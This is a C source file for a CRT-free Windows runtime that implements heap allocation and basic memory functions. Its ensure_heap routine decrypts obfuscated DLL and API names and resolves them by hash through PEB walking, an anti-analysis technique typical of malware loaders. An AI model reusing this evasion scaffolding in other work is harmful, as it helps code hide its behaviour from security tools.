/*
 * rt_mem.c — heap allocation + memory operations via Win32.
 * No CRT. Uses process heap.
 */
#include "rt.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "enc_strings.h"

typedef HANDLE (WINAPI *pGetProcessHeap)(void);
typedef LPVOID (WINAPI *pHeapAlloc)(HANDLE, DWORD, SIZE_T);
typedef LPVOID (WINAPI *pHeapReAlloc)(HANDLE, DWORD, LPVOID, SIZE_T);
typedef BOOL   (WINAPI *pHeapFree)(HANDLE, DWORD, LPVOID);

static struct {
    pGetProcessHeap pGPH;
    pHeapAlloc      pHA;
    pHeapReAlloc    pHR;
    pHeapFree       pHF;
    int             ready;
} g_heap_api;

static int ensure_heap(void) {
    if (g_heap_api.ready) return 1;
    char dll[32]; enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, dll);
    void *k32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!k32) return 0;
    char fn[32];
    enc_decrypt(enc_GetProcessHeap, ENC_GETPROCESSHEAP_LEN, fn);
    g_heap_api.pGPH = (pGetProcessHeap)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_HeapAlloc, ENC_HEAPALLOC_LEN, fn);
    g_heap_api.pHA = (pHeapAlloc)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_HeapReAlloc, ENC_HEAPREALLOC_LEN, fn);
    g_heap_api.pHR = (pHeapReAlloc)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_HeapFree, ENC_HEAPFREE_LEN, fn);
    g_heap_api.pHF = (pHeapFree)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    if (!g_heap_api.pGPH || !g_heap_api.pHA || !g_heap_api.pHF) return 0;
    g_heap_api.ready = 1;
    return 1;
}

static HANDLE g_heap = NULL;

static HANDLE heap(void) {
    if (!g_heap && ensure_heap())
        g_heap = g_heap_api.pGPH();
    return g_heap;
}

void *malloc(size_t n) {
    if (n == 0)
        n = 1;
    return g_heap_api.pHA(heap(), 0, n);
}

void free(void *p) {
    if (p)
        g_heap_api.pHF(heap(), 0, p);
}

void *calloc(size_t nmemb, size_t size) {
    if (nmemb == 0 || size == 0)
        return malloc(1);
    if (nmemb > (size_t)-1 / size)
        return NULL;
    size_t total = nmemb * size;
    void *p = malloc(total);
    if (p)
        memset(p, 0, total);
    return p;
}

/* NOTE: On failure returns NULL; original block at p remains valid.
 * Caller must not overwrite old pointer until checking return. */
void *realloc(void *p, size_t n) {
    if (!p)
        return malloc(n);
    if (n == 0) {
        free(p);
        return NULL;
    }
    return g_heap_api.pHR(heap(), 0, p, n);
}

void *memcpy(void *dst, const void *src, size_t n) {
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    while (n--)
        *d++ = *s++;
    return dst;
}

void *memmove(void *dst, const void *src, size_t n) {
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    if (d < s) {
        while (n--)
            *d++ = *s++;
    } else if (d > s) {
        d += n;
        s += n;
        while (n--)
            *--d = *--s;
    }
    return dst;
}

void *memset(void *dst, int c, size_t n) {
    unsigned char *d = (unsigned char *)dst;
    while (n--)
        *d++ = (unsigned char)c;
    return dst;
}

int memcmp(const void *a, const void *b, size_t n) {
    const unsigned char *x = (const unsigned char *)a;
    const unsigned char *y = (const unsigned char *)b;
    while (n--) {
        if (*x != *y)
            return (int)*x - (int)*y;
        x++;
        y++;
    }
    return 0;
}

void *memchr(const void *s, int c, size_t n) {
    const unsigned char *p = (const unsigned char *)s;
    while (n--) {
        if (*p == (unsigned char)c)
            return (void *)p;
        p++;
    }
    return NULL;
}
